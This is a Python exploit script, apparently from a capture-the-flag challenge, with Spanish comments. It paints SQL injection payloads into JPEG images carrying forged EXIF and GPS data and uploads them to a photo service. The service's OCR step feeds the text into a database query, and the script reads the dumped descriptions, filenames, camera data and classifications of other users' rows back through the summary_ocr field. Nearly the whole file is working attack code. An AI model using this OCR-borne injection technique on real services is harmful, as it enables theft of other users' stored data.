# ocr_dump_fields.py — el código ganador puede estar en un CAMPO de texto de la tabla (no en los
# píxeles). Volcamos description, summary_ocr, filename, make, model de las filas que NO son
# nuestras, vía el oráculo OCR. Buscamos algo con pinta de flag/código.
import requests, base64, re, os
from PIL import Image, ImageDraw, ImageFont
import piexif

BASE = "https://chl-5164f230-2a03-41d3-b9a5-9d2931b34c94-mis-viajes-v2.softwareseguro.com.ar"
PAISAJE = "assets/paisaje.png" if os.path.exists("assets/paisaje.png") else "paisaje.png"
html = requests.get(BASE + "/").text
UID = re.search(r'([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})', html).group(1)
base_img = Image.open(PAISAJE).convert("RGB")
q = "'"


def font(sz):
    for p in ["C:/Windows/Fonts/consolab.ttf", "C:/Windows/Fonts/cour.ttf"]:
        try:
            return ImageFont.truetype(p, sz)
        except Exception:
            pass
    return ImageFont.load_default()


def build(text, fname, size=30):
    W = min(2000, max(1000, 40 + int(len(text) * size * 0.56)))
    H = 260
    img = base_img.resize((W, H)); d = ImageDraw.Draw(img); f = font(size)
    bb = d.textbbox((20, 20), text, font=f)
    d.rectangle([0, 0, W, bb[3] + 20], fill=(255, 255, 255))
    d.text((20, 20), text, font=f, fill=(0, 0, 0))
    img.save(fname, "jpeg", quality=72, optimize=True)

    def dms(x):
        dd = int(x); mm = int((x - dd) * 60); s = round((x - dd - mm / 60) * 3600, 4)
        return ((dd, 1), (mm, 1), (int(s * 100), 100))
    exd = {'0th': {piexif.ImageIFD.Make: b'Samsung', piexif.ImageIFD.Model: b'Galaxy S25'},
           'Exif': {piexif.ExifIFD.DateTimeOriginal: b'2025:10:01 23:51:37'},
           'GPS': {piexif.GPSIFD.GPSLatitudeRef: b'S', piexif.GPSIFD.GPSLatitude: dms(41.13),
                   piexif.GPSIFD.GPSLongitudeRef: b'W', piexif.GPSIFD.GPSLongitude: dms(71.31)}}
    piexif.insert(piexif.dump(exd), fname)
    return "data:image/jpeg;base64," + base64.b64encode(open(fname, "rb").read()).decode()


def ex(inner, desc):
    painted = "9" + q + "||(" + inner + ")||" + q + "9"
    fname = f"fld_{desc}.jpg"
    uri = build(painted, fname)
    r = requests.post(f"{BASE}/upload", json={"image": uri, "description": desc, "user_id": UID})
    ocr = ""
    if r.status_code == 200:
        data = requests.get(f"{BASE}/images/{UID}").json()
        row = next((x for x in data if x.get("description") == desc), None)
        ocr = row.get("summary_ocr", "") if row else ""
    print(f"[{desc:14}] {r.status_code}  ocr={ocr!r}")
    return r.status_code, ocr


print(f"UID: {UID}\n=== volcar campos de texto de todas las filas (sin comillas) ===\n")
# char(58)=':'  char(124)='|' separador de filas ; concatenamos id:campo
ex("SELECT group_concat(id||char(58)||description) FROM imagenes", "descriptions")
ex("SELECT group_concat(id||char(58)||summary_ocr) FROM imagenes", "summaries")
ex("SELECT group_concat(id||char(58)||filename) FROM imagenes", "filenames")
ex("SELECT group_concat(distinct make||char(47)||model) FROM imagenes", "cameras")
ex("SELECT group_concat(id||char(58)||classification) FROM imagenes", "classes")
